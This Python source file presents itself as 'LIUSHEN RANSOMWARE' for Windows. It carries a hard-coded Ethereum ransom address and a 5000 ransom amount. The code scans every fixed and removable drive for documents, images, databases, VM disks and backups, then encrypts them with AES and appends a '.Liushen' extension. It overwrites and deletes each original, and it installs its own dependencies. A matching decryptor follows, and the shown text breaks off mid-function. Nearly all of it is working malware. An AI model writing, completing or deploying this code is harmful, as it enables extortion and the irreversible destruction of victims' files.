#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
LIUSHEN RANSOMWARE
VERSION: FINAL ULTRA STABLE
TARGET: WINDOWS ONLY
ETH ADDRESS: 0x81830DF553d62bE793c3E7dC0184dF3728b33F3
"""

import os
import sys
import time
import base64
import socket
import platform
import subprocess
import argparse
import random
import string
import threading
import json
import hashlib
import hmac
import shutil
import logging
import tempfile
import ctypes
import traceback
import winreg
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Any, Set, Callable
from queue import Queue, Empty, Full
from enum import Enum
from dataclasses import dataclass, field
from functools import wraps

# ==================== GLOBAL VARIABLES ====================
AES = None
pad = None
unpad = None
get_random_bytes = None
psutil = None
requests = None
win32api = None
win32con = None

# ==================== CONSTANTS ====================
ETH_ADDRESS = "0x81830DF553d62bE793c3E7dC0184dF3728b33F3"
RANSOM_AMOUNT = "5000"
EXTENSION = ".Liushen"
VERSION = "FINAL_ULTRA_STABLE"
AES_BLOCK_SIZE = 16
HMAC_SIZE = 32
IV_SIZE = 16
MASTER_KEY_SIZE = 32

# ==================== ENUMS ====================
class OperationStatus(Enum):
    SUCCESS = "success"
    FAILED = "failed"
    SKIPPED = "skipped"
    PENDING = "pending"
    TIMEOUT = "timeout"
    PERMISSION_DENIED = "permission_denied"
    FILE_NOT_FOUND = "file_not_found"

class WorkerState(Enum):
    IDLE = "idle"
    WORKING = "working"
    STOPPED = "stopped"

# ==================== EXCEPTIONS ====================
class LiushenError(Exception):
    """Base exception for Liushen ransomware"""
    pass

# ==================== DATACLASSES ====================
@dataclass
class FileInfo:
    """Container for file information"""
    path: str
    size: int
    encrypted_path: str = ""
    status: OperationStatus = OperationStatus.PENDING
    error: str = ""
    file_id: str = ""

    def __post_init__(self):
        if not self.file_id:
            self.file_id = hashlib.md5(self.path.encode()).hexdigest()[:8]

@dataclass
class EncryptionResult:
    """Container for encryption/decryption result"""
    success: bool
    file_path: str
    error_message: str = ""
    bytes_processed: int = 0

# ==================== DECORATORS ====================
def safe_execution(default_return=None, error_message="", retry=0):
    """Decorator for safe function execution with retry logic"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(retry + 1):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == retry:
                        # Try to find logger in arguments
                        for arg in args:
                            if hasattr(arg, 'logger') and hasattr(arg.logger, 'error'):
                                arg.logger.error(f"{error_message}: {e}")
                                break
                        return default_return
                    time.sleep(1 * (2 ** attempt))
            return default_return
        return wrapper
    return decorator

def require_deps(*modules):
    """Decorator to ensure required dependencies are available"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            deps_map = {
                'crypto': AES is not None,
                'psutil': psutil is not None,
                'win32': win32api is not None
            }
            missing = [mod for mod in modules if mod in deps_map and not deps_map[mod]]
            if missing:
                raise LiushenError(f"Missing dependencies: {missing}")
            return func(*args, **kwargs)
        return wrapper
    return decorator

# ==================== DEPENDENCY CHECK ====================
def check_dependencies() -> bool:
    """Check and install required dependencies"""
    global AES, pad, unpad, get_random_bytes, psutil, requests, win32api, win32con
    
    packages = {
        'pycryptodome': 'Crypto.Cipher',
        'psutil': 'psutil',
        'requests': 'requests',
        'pywin32': 'win32api'
    }
    
    print("[*] Checking dependencies...")
    missing = []
    
    for package, module in packages.items():
        try:
            __import__(module.split('.')[0])
            print(f"[+] {package}")
        except ImportError:
            missing.append(package)
            print(f"[-] {package}")
    
    if missing:
        print(f"[*] Installing: {', '.join(missing)}")
        for package in missing:
            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", package],
                    check=True, capture_output=True, timeout=60
                )
                print(f"[+] Installed {package}")
            except Exception as e:
                print(f"[-] Failed to install {package}: {e}")
                return False
    
    try:
        # Import crypto modules
        from Crypto.Cipher import AES as _AES
        from Crypto.Util.Padding import pad as _pad, unpad as _unpad
        from Crypto.Random import get_random_bytes as _get_random_bytes
        
        AES = _AES
        pad = _pad
        unpad = _unpad
        get_random_bytes = _get_random_bytes
        
        # Test crypto
        test_key = get_random_bytes(32)
        test_iv = get_random_bytes(16)
        test_cipher = AES.new(test_key, AES.MODE_CBC, test_iv)
        test_data = b"test"
        test_padded = pad(test_data, AES_BLOCK_SIZE)
        test_encrypted = test_cipher.encrypt(test_padded)
        
        # Import other modules
        import psutil as _psutil
        psutil = _psutil
        
        import requests as _requests
        requests = _requests
        
        import win32api as _win32api
        import win32con as _win32con
        win32api = _win32api
        win32con = _win32con
        
        print("[+] All dependencies loaded successfully")
        return True
        
    except Exception as e:
        print(f"[-] Dependency validation failed: {e}")
        return False

# ==================== LOGGER ====================
class Logger:
    """Thread-safe singleton logger with file and console output"""
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
            return cls._instance
    
    def __init__(self):
        if hasattr(self, 'initialized'):
            return
        
        self.start_time = time.time()
        self.error_count = 0
        self.warning_count = 0
        
        # Create log directory
        log_dir = os.path.join(tempfile.gettempdir(), "logs")
        os.makedirs(log_dir, exist_ok=True)
        
        # Create log file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = os.path.join(log_dir, f"liushen_{timestamp}.log")
        
        # Setup logger
        self.logger = logging.getLogger("liushen")
        self.logger.setLevel(logging.INFO)
        
        # Clear existing handlers to prevent duplicates
        if self.logger.handlers:
            self.logger.handlers.clear()
        
        # Console handler
        console = logging.StreamHandler()
        console.setFormatter(logging.Formatter('%(asctime)s - %(message)s', '%H:%M:%S'))
        self.logger.addHandler(console)
        
        # File handler
        try:
            file_handler = logging.FileHandler(log_file)
            file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            self.logger.addHandler(file_handler)
        except Exception:
            pass
        
        self.initialized = True
    
    def info(self, msg: str):
        self.logger.info(msg)
    
    def error(self, msg: str):
        self.error_count += 1
        self.logger.error(msg)
    
    def warning(self, msg: str):
        self.warning_count += 1
        self.logger.warning(msg)
    
    def debug(self, msg: str):
        self.logger.debug(msg)
    
    def exception(self, msg: str):
        self.error_count += 1
        self.logger.exception(msg)

# ==================== CONFIGURATION ====================
class Config:
    """Centralized configuration singleton"""
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
            return cls._instance
    
    def __init__(self):
        if hasattr(self, 'initialized'):
            return
        
        # Ransomware configuration
        self.eth_address = ETH_ADDRESS
        self.ransom_amount = RANSOM_AMOUNT
        self.extension = EXTENSION
        
        # Performance configuration
        self.max_workers = max(2, min(4, os.cpu_count() or 2))
        self.batch_size = 20
        self.max_file_size = 50 * 1024 * 1024  # 50 MB
        self.chunk_size = 64 * 1024  # 64 KB
        self.queue_maxsize = 5000
        self.thread_timeout = 120
        self.secure_passes = 3
        self.hmac_iterations = 100000
        
        # Target file extensions
        self.target_extensions = {
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.txt', '.rtf', '.odt', '.jpg', '.jpeg',
            '.png', '.gif', '.bmp', '.mp3', '.mp4', '.avi',
            '.zip', '.rar', '.7z', '.sql', '.db', '.mdb',
            '.pst', '.ost', '.key', '.vmx', '.vmdk', '.bak'
        }
        
        # Excluded directories
        self.exclude_dirs = {
            'windows', 'program files', 'program files (x86)',
            'programdata', 'boot', 'system32', '$recycle.bin',
            'appdata', 'temp', 'tmp', 'cache', '.cache'
        }
        
        self.initialized = True

# ==================== WINDOWS API ====================
class WindowsAPI:
    """Windows API wrapper with error handling"""
    
    def __init__(self, logger: Logger):
        self.logger = logger
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    
    @safe_execution(default_return=False)
    def is_admin(self) -> bool:
        """Check if running with administrator privileges"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    
    @safe_execution(default_return=[])
    def get_drives(self) -> List[str]:
        """Get all fixed and removable drives"""
        drives = []
        try:
            # Try using win32api first
            bitmask = win32api.GetLogicalDrives()
            for i in range(26):
                if bitmask & (1 << i):
                    drive = f"{chr(65 + i)}:\\"
                    drive_type = win32api.GetDriveType(drive)
                    if drive_type in [win32con.DRIVE_FIXED, win32con.DRIVE_REMOVABLE]:
                        drives.append(drive)
        except Exception:
            try:
                # Fallback to kernel32
                bitmask = self.kernel32.GetLogicalDrives()
                for i in range(26):
                    if bitmask & (1 << i):
                        drives.append(f"{chr(65 + i)}:\\")
            except Exception:
                drives = ["C:\\"]
        
        return drives
    
    @safe_execution(default_return=False)
    def set_hidden(self, path: str) -> bool:
        """Set file/folder hidden attribute"""
        try:
            self.kernel32.SetFileAttributesW(path, 0x02)
            return True
        except Exception:
            return False

# ==================== CRYPTO ENGINE ====================
class CryptoEngine:
    """
    Cryptographic engine with proper AES-CBC streaming
    FIXED: 
    - Only pads the last block
    - Streams data without loading entire file into memory
    - Proper HMAC verification
    """
    
    def __init__(self, logger: Logger):
        self.logger = logger
        self.config = Config()
        self.encrypt_count = 0
        self.decrypt_count = 0
        self.error_count = 0
        self.lock = threading.RLock()
    
    @require_deps('crypto')
    def encrypt_file(self, input_path: str, output_path: str, 
                    master_key: bytes, hmac_key: bytes) -> EncryptionResult:
        """
        Encrypt file using AES-CBC with proper padding (only last block)
        FIXED: Correct streaming encryption - only pad at the end
        """
        # Initialize temp_output at the beginning to avoid UnboundLocalError
        temp_output = output_path + ".tmp"
        start_time = time.time()
        
        try:
            # Validate input file
            if not os.path.exists(input_path):
                return EncryptionResult(False, input_path, "File not found")
            
            if not os.access(input_path, os.R_OK):
                return EncryptionResult(False, input_path, "No read permission")
            
            file_size = os.path.getsize(input_path)
            if file_size == 0:
                return EncryptionResult(False, input_path, "Empty file")
            
            if file_size > self.config.max_file_size:
                return EncryptionResult(False, input_path, "File too large")
            
            # Generate random IV
            iv = get_random_bytes(IV_SIZE)
            
            # Derive file-specific key
            file_key = hashlib.pbkdf2_hmac(
                'sha256',
                master_key + iv,
                b'file_key',
                self.config.hmac_iterations,
                dklen=MASTER_KEY_SIZE
            )
            
            # Setup cipher
            cipher = AES.new(file_key, AES.MODE_CBC, iv)
            
            # Setup HMAC
            hasher = hmac.new(hmac_key, digestmod=hashlib.sha256)
            hasher.update(iv)
            
            with open(input_path, 'rb') as fin, open(temp_output, 'wb') as fout:
                # Write IV first
                fout.write(iv)
                
                # Buffer untuk menyimpan sisa data yang belum genap block
                remainder = bytearray()
                
                while True:
                    chunk = fin.read(self.config.chunk_size)
                    if not chunk:
                        break
                    
                    # Update HMAC dengan plaintext
                    hasher.update(chunk)
                    
                    # Gabungkan dengan remainder dari chunk sebelumnya
                    if remainder:
                        chunk = remainder + chunk
                        remainder.clear()
                    
                    # Hitung sisa yang tidak genap block
                    remainder_size = len(chunk) % AES_BLOCK_SIZE
                    
                    if remainder_size == 0:
                        # Genap, encrypt semua
                        encrypted = cipher.encrypt(chunk)
                        fout.write(encrypted)
                    else:
                        # Pisahkan yang genap dan ganjil
                        encrypt_size = len(chunk) - remainder_size
                        if encrypt_size > 0:
                            encrypted = cipher.encrypt(chunk[:encrypt_size])
                            fout.write(encrypted)
                        
                        # Simpan sisa untuk chunk berikutnya
                        remainder.extend(chunk[encrypt_size:])
                
                # Proses remainder terakhir - ini adalah final block yang perlu di-pad
                if remainder:
                    padded = pad(bytes(remainder), AES_BLOCK_SIZE)
                    encrypted = cipher.encrypt(padded)
                    fout.write(encrypted)
                
                # Write final HMAC
                fout.write(hasher.digest())
            
            # Verify encryption
            if not self.verify_file(temp_output, master_key, hmac_key):
                if os.path.exists(temp_output):
                    os.remove(temp_output)
                return EncryptionResult(False, input_path, "Verification failed")
            
            # Move to final location
            shutil.move(temp_output, output_path)
            
            # Update statistics
            with self.lock:
                self.encrypt_count += 1
            
            return EncryptionResult(True, input_path, bytes_processed=file_size)
            
        except Exception as e:
            self.logger.exception(f"Encryption error: {input_path}")
            with self.lock:
                self.error_count += 1
            
            # Safe cleanup - check if temp_output exists
            if temp_output and os.path.exists(temp_output):
                try:
                    os.remove(temp_output)
                except Exception:
                    pass
            
            return EncryptionResult(False, input_path, str(e))
    
    @require_deps('crypto')
    def decrypt_file(self, input_path: str, output_path: str,
                    master_key: bytes, hmac_key: bytes) -> EncryptionResult:
        """
        Decrypt file with proper streaming
        FIXED: Streams data without loading entire file into memory
        """
        # Initialize temp_output at the beginning
        temp_output = output_path + ".tmp"
        start_time = time.time()
        
        try:
            # Validate input file
            if not os.path.exists(input_path):
                return EncryptionResult(False, input_path, "File not found")
            
            file_size = os.path.getsize(input_path)
            if file_size < IV_SIZE + HMAC_SIZE:
                return EncryptionResult(False, input_path, "File too small")
            
            with open(input_path, 'rb') as fin:
                # Read IV
                iv = fin.read(IV_SIZE)
                if len(iv) != IV_SIZE:
                    return EncryptionResult(False, input_path, "Invalid IV")
                
                # Derive file key
                file_key = hashlib.pbkdf2_hmac(
                    'sha256',
                    master_key + iv,
                    b'file_key',
                    self.config.hmac_iterations,
                    dklen=MASTER_KEY_SIZE
                )
                
                # Setup cipher
                cipher = AES.new(file_key, AES.MODE_CBC, iv)
                
                # Setup verifier
                verifier = hmac.new(hmac_key, digestmod=hashlib.sha256)
                verifier.update(iv)
                
                # Get encrypted data size
                fin.seek(0, 2)
                total_size = fin.tell()
                fin.seek(IV_SIZE)
                
                encrypted_size = total_size - IV_SIZE - HMAC_SIZE
                if encrypted_size <= 0:
                    return EncryptionResult(False, input_path, "No encrypted data")
                
                # Validasi alignment AES block
                if encrypted_size % AES_BLOCK_SIZE != 0:
                    return EncryptionResult(False, input_path, "Invalid encryption alignment")
                
                # Buffer untuk sisa data
                remainder = bytearray()
                bytes_read = 0
                
                with open(temp_output, 'wb') as fout:
                    while bytes_read < encrypted_size:
                        # Tentukan ukuran chunk
                        chunk_size = min(self.config.chunk_size, encrypted_size - bytes_read)
                        encrypted_chunk = fin.read(chunk_size)
                        
                        if not encrypted_chunk:
                            break
                        
                        # Decrypt chunk
                        decrypted = cipher.decrypt(encrypted_chunk)
                        bytes_read += len(encrypted_chunk)
                        
                        # Cek apakah ini chunk terakhir
                        is_last = bytes_read >= encrypted_size
                        
                        if is_last:
                            # Ini chunk terakhir, gabungkan dengan remainder
                            if remainder:
                                decrypted = remainder + decrypted
                                remainder.clear()
                            
                            # Unpad data terakhir
                            try:
                                unpadded = unpad(decrypted, AES_BLOCK_SIZE)
                                fout.write(unpadded)
                                verifier.update(unpadded)
                            except ValueError as e:
                                return EncryptionResult(False, input_path, f"Padding error: {e}")
                        else:
                            # Bukan chunk terakhir
                            if remainder:
                                decrypted = remainder + decrypted
                                remainder.clear()
                            
                            # Cek sisa yang tidak genap block
                            remainder_size = len(decrypted) % AES_BLOCK_SIZE
                            
                            if remainder_size == 0:
                                # Genap, tulis semua
                                fout.write(decrypted)
                                verifier.update(decrypted)
                            else:
                                # Pisahkan yang genap
                                write_size = len(decrypted) - remainder_size
                                if write_size > 0:
                                    fout.write(decrypted[:write_size])
                                    verifier.update(decrypted[:write_size])
                                
                                # Simpan sisa untuk chunk berikutnya
                                remainder.extend(decrypted[write_size:])
                    
                    # Baca dan verifikasi HMAC
                    stored_hmac = fin.read(HMAC_SIZE)
                    if len(stored_hmac) != HMAC_SIZE:
                        return EncryptionResult(False, input_path, "Invalid HMAC length")
                    
                    calculated_hmac = verifier.digest()
                    if not hmac.compare_digest(calculated_hmac, stored_hmac):
                        return EncryptionResult(False, input_path, "HMAC mismatch")
            
            # Verify decryption output
            if not os.path.exists(temp_output) or os.path.getsize(temp_output) == 0:
                return EncryptionResult(False, input_path, "Decryption produced empty file")
            
            # Move to final location
            shutil.move(temp_output, output_path)
            
            # Update statistics
            with self.lock:
                self.decrypt_count += 1
            
            return EncryptionResult(True, input_path, bytes_processed=file_size)
            
        except Exception as e:
            self.logger.exception(f"Decryption error: {input_path}")
            with self.lock:
                self.error_count += 1
            
            # Safe cleanup
            if temp_output and os.path.exists(temp_output):
                try:
                    os.remove(temp_output)
                except Exception:
                    pass
            
            return EncryptionResult(False, input_path, str(e))
    
    @require_deps('crypto')
    def verify_file(self, encrypted_path: str, master_key: bytes, hmac_key: bytes) -> bool:
        """
        Verify encrypted file integrity
        FIXED: Single verification function for all needs
        """
        try:
            if not os.path.exists(encrypted_path):
                return False
            
            file_size = os.path.getsize(encrypted_path)
            if file_size < IV_SIZE + HMAC_SIZE:
                return False
            
            with open(encrypted_path, 'rb') as f:
                # Read IV
                iv = f.read(IV_SIZE)
                if len(iv) != IV_SIZE:
                    return False
                
                # Derive file key
                file_key = hashlib.pbkdf2_hmac(
                    'sha256',
                    master_key + iv,
                    b'file_key',
                    self.config.hmac_iterations,
                    dklen=MASTER_KEY_SIZE
                )
                
                # Setup cipher and verifier
                cipher = AES.new(file_key, AES.MODE_CBC, iv)
                verifier = hmac.new(hmac_key, digestmod=hashlib.sha256)
                verifier.update(iv)
                
                # Get encrypted data size
                f.seek(0, 2)
                total = f.tell()
                f.seek(IV_SIZE)
                
                encrypted_size = total - IV_SIZE - HMAC_SIZE
                if encrypted_size <= 0:
                    return False
                
                if encrypted_size % AES_BLOCK_SIZE != 0:
                    return False
                
                # Process encrypted data
                remainder = bytearray()
                bytes_read = 0
                
                while bytes_read < encrypted_size:
                    chunk = f.read(self.config.chunk_size)
                    if not chunk:
                        break
                    
                    decrypted = cipher.decrypt(chunk)
                    bytes_read += len(chunk)
                    
                    is_last = bytes_read >= encrypted_size
                    
                    if is_last:
                        if remainder:
                            decrypted = remainder + decrypted
                        
                        try:
                            unpadded = unpad(decrypted, AES_BLOCK_SIZE)
                            verifier.update(unpadded)
                        except ValueError:
                            return False
                    else:
                        if remainder:
                            decrypted = remainder + decrypted
                            remainder.clear()
                        
                        remainder_size = len(decrypted) % AES_BLOCK_SIZE
                        
                        if remainder_size == 0:
                            verifier.update(decrypted)
                        else:
                            write_size = len(decrypted) - remainder_size
                            if write_size > 0:
                                verifier.update(decrypted[:write_size])
                            remainder.extend(decrypted[write_size:])
                
                # Read and verify HMAC
                stored_hmac = f.read(HMAC_SIZE)
                if len(stored_hmac) != HMAC_SIZE:
                    return False
                
                calculated_hmac = verifier.digest()
                return hmac.compare_digest(calculated_hmac, stored_hmac)
                
        except Exception as e:
            return False
    
    def secure_delete(self, path: str) -> bool:
        """Securely delete file with multiple overwrite passes"""
        try:
            if not os.path.exists(path):
                return True
            
            file_size = os.path.getsize(path)
            
            # Overwrite small files multiple times
            if file_size < 10 * 1024 * 1024:  # < 10 MB
                try:
                    with open(path, 'r+b') as f:
                        for _ in range(self.config.secure_passes):
                            f.seek(0)
                            f.write(os.urandom(file_size))
                            f.flush()
                            os.fsync(f.fileno())
                except Exception:
                    pass
            
            # Delete file
            os.remove(path)
            return not os.path.exists(path)
            
        except Exception:
            return False

# ==================== FILE ENCRYPTOR ====================
class FileEncryptor:
    """
    Multi-threaded file encryptor with queue system
    FIXED: 
    - files_queued counter now works correctly
    - Threads are properly joined on shutdown
    """
    
    def __init__(self, master_key: bytes, logger: Logger):
        self.master_key = master_key
        self.logger = logger
        self.config = Config()
        
        # Statistics
        self.encrypted_count = 0
        self.failed_files = []  # List of (path, error)
        self.skipped_files = []  # List of (path, reason)
        self.encrypted_files = {}  # Dict[file_id, FileInfo]
        self.file_status = {}  # Dict[path, OperationStatus]
        self.bytes_processed = 0
        self.files_queued_total = 0  # Total files queued across all drives
        
        # Threading
        self.lock = threading.RLock()
        self.file_queue = Queue(maxsize=self.config.queue_maxsize)
        self.stop_event = threading.Event()
        self.workers = []
        self.active_workers = 0
        
        # Windows API
        self.winapi = WindowsAPI(logger)
        
        # Generate HMAC key
        self.hmac_key = hashlib.pbkdf2_hmac(
            'sha256',
            master_key + b'hmac_salt',
            b'hmac_derivation',
            self.config.hmac_iterations,
            dklen=32
        )
        
        # Crypto engine
        self.crypto = CryptoEngine(logger)
        
        self.start_time = time.time()
    
    def encrypt_file(self, file_path: str) -> bool:
        """Encrypt a single file"""
        try:
            # Validate file
            if not os.path.exists(file_path):
                with self.lock:
                    self.skipped_files.append((file_path, "File not found"))
                    self.file_status[file_path] = OperationStatus.FILE_NOT_FOUND
                return False
            
            if not os.access(file_path, os.R_OK):
                with self.lock:
                    self.skipped_files.append((file_path, "No read permission"))
                    self.file_status[file_path] = OperationStatus.PERMISSION_DENIED
                return False
            
            if file_path.endswith(self.config.extension):
                with self.lock:
                    self.skipped_files.append((file_path, "Already encrypted"))
                    self.file_status[file_path] = OperationStatus.SKIPPED
                return False
            
            file_size = os.path.getsize(file_path)
            if file_size > self.config.max_file_size:
                with self.lock:
                    self.skipped_files.append((file_path, "File too large"))
                    self.file_status[file_path] = OperationStatus.SKIPPED
                return False
            
            if file_size == 0:
                with self.lock:
                    self.skipped_files.append((file_path, "Empty file"))
                    self.file_status[file_path] = OperationStatus.SKIPPED
                return False
            
            # Check if file is in use
            try:
                with open(file_path, 'rb') as f:
                    f.read(1)
            except Exception:
                with self.lock:
                    self.skipped_files.append((file_path, "File in use"))
                    self.file_status[file_path] = OperationStatus.PERMISSION_DENIED
                return False
            
            encrypted_path = file_path + self.config.extension
            
            # Encrypt
            result = self.crypto.encrypt_file(
                file_path, encrypted_path, self.master_key, self.hmac_key
            )
            
            if not result.success:
                with self.lock:
                    self.failed_files.append((file_path, result.error_message))
                    self.file_status[file_path] = OperationStatus.FAILED
                return False
            
            # Secure delete original
            self.crypto.secure_delete(file_path)
            
            # Update statistics
            with self.lock:
                self.encrypted_count += 1
                self.bytes_processed += file_size
                
                file_info = FileInfo(
                    path=file_path,
                    size=file_size,
                    encrypted_path=encrypted_path,
                    status=OperationStatus.SUCCESS
                )
                self.encrypted_files[file_info.file_id] = file_info
                self.file_status[file_path] = OperationStatus.SUCCESS
            
            self.logger.info(f"Encrypted: {file_path}")
            return True
            
        except Exception as e:
            self.logger.exception(f"Error encrypting {file_path}")
            with self.lock:
                self.failed_files.append((file_path, str(e)))
                self.file_status[file_path] = OperationStatus.FAILED
            return False
    
    def _worker(self, worker_id: int):
        """Worker thread for processing files from queue"""
        with self.lock:
            self.active_workers += 1
        
        processed = 0
        errors = 0
        
        try:
            while not self.stop_event.is_set():
                try:
                    # Get file from queue with timeout
                    file_path = self.file_queue.get(timeout=0.5)
                    
                    # Process file
                    if self.encrypt_file(file_path):
                        processed += 1
                    else:
                        errors += 1
                    
                    self.file_queue.task_done()
                    
                except Empty:
                    # Queue empty, continue waiting unless stop requested
                    continue
                except Exception as e:
                    errors += 1
                    try:
                        self.file_queue.task_done()
                    except Exception:
                        pass
        finally:
            with self.lock:
                self.active_workers -= 1
            self.logger.debug(f"Worker {worker_id} stopped (processed: {processed}, errors: {errors})")
    
    def start_workers(self):
        """Start worker threads"""
        self.stop_event.clear()
        for i in range(self.config.max_workers):
            t = threading.Thread(target=self._worker, args=(i,), daemon=True)
            t.start()
            self.workers.append(t)
        self.logger.info(f"Started {self.config.max_workers} workers")
    
    def stop_workers(self):
        """Stop all worker threads gracefully"""
        self.stop_event.set()
        
        # Join all threads with timeout
        for i, t in enumerate(self.workers):
            try:
                t.join(timeout=2)
                if t.is_alive():
                    self.logger.warning(f"Worker {i} still alive after timeout")
            except Exception as e:
                self.logger.error(f"Error stopping worker {i}: {e}")
        
        self.workers.clear()
    
    def encrypt_drive(self, drive_path: str) -> Tuple[int, int]:
        """
        Encrypt all target files on a drive
        FIXED: files_queued counter now works correctly using nonlocal
        """
        files_queued = 0
        
        try:
            if not os.path.exists(drive_path):
                return 0, 0
            
            self.logger.info(f"Scanning drive: {drive_path}")
            
            # Start workers
            self.start_workers()
            
            visited = set()
            
            # FIX: Proper increment function using nonlocal
            def increment_counter():
                nonlocal files_queued
                files_queued += 1
                self.files_queued_total += 1
            
            # Walk directory and queue files
            self._walk_directory(drive_path, visited, increment_counter)
            
            # Wait for queue to empty
            queue_size = self.file_queue.qsize()
            if queue_size > 0:
                self.logger.info(f"Waiting for {queue_size} files to process...")
                self.file_queue.join()
            
            # Stop workers
            self.stop_workers()
            
            return files_queued, self.encrypted_count
            
        except Exception as e:
            self.logger.exception(f"Drive encryption error: {drive_path}")
            return files_queued, self.encrypted_count
    
    def _walk_directory(self, path: str, visited: Set, callback: Callable, depth: int = 0):
        """Recursively walk directory and queue target files"""
        if depth > 50:  # Prevent infinite recursion
            return
        
        try:
            # Resolve path to avoid cycles
            real_path = os.path.realpath(path)
            if real_path in visited:
                return
            visited.add(real_path)
            
            # Check accessibility
            if not os.path.exists(real_path) or not os.access(real_path, os.R_OK):
                return
            
            try:
                items = os.listdir(real_path)
            except (PermissionError, OSError):
                return
            
            for item in items:
                if self.stop_event.is_set():
                    return
                
                try:
                    full_path = os.path.join(real_path, item)
                    
                    if not os.path.exists(full_path):
                        continue
                    
                    # Check exclusion
                    if self._is_excluded(full_path):
                        continue
                    
                    if os.path.isdir(full_path):
                        # Recursively walk subdirectory
                        self._walk_directory(full_path, visited, callback, depth + 1)
                    else:
                        # Check if file extension is targeted
                        ext = os.path.splitext(item)[1].lower()
                        if ext in self.config.target_extensions:
                            try:
                                self.file_queue.put(full_path, timeout=1)
                                callback()  # FIX: Increment counter
                            except Full:
                                # Queue full, wait and retry
                                time.sleep(0.5)
                                self.file_queue.put(full_path, timeout=5)
                                callback()
                except Exception:
                    continue
                    
        except Exception as e:
            self.logger.debug(f"Error walking directory {path}: {e}")
    
    def _is_excluded(self, path: str) -> bool:
        """Check if path should be excluded from encryption"""
        path_lower = path.lower()
        parts = path_lower.split(os.sep)
        
        for part in parts:
            if part in self.config.exclude_dirs:
                return True
            # Windows system directories
            if part in ['windows', 'program files', 'program files (x86)', 'programdata']:
                return True
        
        return False
    
    def encrypt_all(self) -> Tuple[int, Dict, List]:
        """Encrypt all target drives"""
        overall_start = time.time()
        
        # Reset statistics
        self.encrypted_count = 0
        self.failed_files = []
        self.skipped_files = []
        self.encrypted_files = {}
        self.file_status = {}
        self.bytes_processed = 0
        self.files_queued_total = 0
        
        # Get all drives
        drives = self.winapi.get_drives()
        self.logger.info(f"Target drives: {drives}")
        
        total_queued = 0
        
        # Process each drive
        for drive in drives:
            queued, processed = self.encrypt_drive(drive)
            total_queued += queued
        
        # Calculate statistics
        elapsed = time.time() - overall_start
        speed = self.bytes_processed / max(elapsed, 0.001) / 1024
        
        # Log summary
        self.logger.info("=" * 50)
        self.logger.info("ENCRYPTION SUMMARY")
        self.logger.info("=" * 50)
        self.logger.info(f"Files encrypted: {self.encrypted_count}")
        self.logger.info(f"Files failed: {len(self.failed_files)}")
        self.logger.info(f"Files skipped: {len(self.skipped_files)}")
        self.logger.info(f"Files queued: {self.files_queued_total}")
        self.logger.info(f"Bytes processed: {self.bytes_processed:,}")
        self.logger.info(f"Total time: {elapsed:.2f} seconds")
        self.logger.info(f"Average speed: {speed:.2f} KB/s")
        
        return self.encrypted_count, self.encrypted_files, self.failed_files

# ==================== FILE DECRYPTOR ====================
class FileDecryptor:
    """File decryptor with batch processing"""
    
    def __init__(self, master_key: bytes, logger: Logger):
        self.master_key = master_key
        self.logger = logger
        self.config = Config()
        
        # Statistics
        self.decrypted_count = 0
        self.failed_files = []  # List of (path, error)
        self.skipped_files = []  # List of (path, reason)
        self.bytes_processed = 0
        
        # Threading
        self.lock = threading.RLock()
        
        # Generate HMAC key
        self.hmac_key = hashlib.pbkdf2_hmac(
            'sha256',
            master_key + b'hmac_salt',
            b'hmac_derivation',
            self.config.hmac_iterations,
            dklen=32
        )
        
        # Crypto engine
        self.crypto = CryptoEngine(logger)
        
        self.start_time = time.time()
    
    def decrypt_file(self, encrypted_path: str) -> bool:
        """Decrypt a single file"""
        try:
            if not os.path.exists(encrypted_path):
                with self.lock:
                    self.failed_files.append((encrypted_path, "File not found"))
                return False
            
            if not encrypted_path.endswith(self.config.extension):
                with self.lock:
                    self.skipped_files.append((encrypted_path, "Not an encrypted file"))
                return False
            
            # Determine original file path
            original_path = encrypted_path[:-len(self.config.extension)]
            
            # Handle case where original file already exists
            if os.path.exists(original_path):
                base, ext = os.path.splitext(original_path)
                counter = 1
                while os.path.exists(f"{base}_restored_{counter}{ext}"):
                    counter += 1
                original_path = f"{base}_restored_{counter}{ext}"
            
            # Decrypt
            result = self.crypto.decrypt_file(
                encrypted_path, original_path, self.master_key, self.hmac_key
            )
            
            if not result.success:
                with self.lock:
                    self.failed_files.append((encrypted_path, result.error_message))
                return False
            
            # Delete encrypted file after successful decryption
            try:
                os.remove(encrypted_path)
            except Exception:
                pass
            
            # Update statistics
            with self.lock:
                self.decrypted_count += 1
                self.bytes_processed += os.path.getsize(original_path)
            
            self.logger.info(f"Decrypted: {encrypted_path}")
            return True
            
        except Exception as e:
            with self.lock:
                self.failed_files.append((encrypted_path, str(e)))
            return False
    
    def decrypt_directory(self, directory: str) -> Tuple[int, List]:
        """Decrypt all encrypted files in a directory"""
        try:
            if not os.path.exists(directory):
                self.logger.error(f"Directory not found: {directory}")
                return 0, []
            
            self.logger.info(f"Scanning directory: {directory}")
            
            files = []
            
            # Walk directory
            for root, dirs, names in os.walk(directory):
                # Filter excluded directories
                dirs[:] = [d for d in dirs if not self._is_excluded(os.path.join(root, d))]
                
                for name in names:
                    if name.endswith(self.config.extension):
                        files.append(os.path.join(root, name))
                        
                        # Process in batches
                        if len(files) >= self.config.batch_size:
                            self._process_batch(files)
                            files = []
            
            # Process remaining files
            if files:
                self._process_batch(files)
            
            # Calculate statistics
            elapsed = time.time() - self.start_time
            speed = self.bytes_processed / max(elapsed, 0.001) / 1024
            
            # Log summary
            self.logger.info("=" * 50)
            self.logger.info("DECRYPTION SUMMARY")
            self.logger.info("=" * 50)
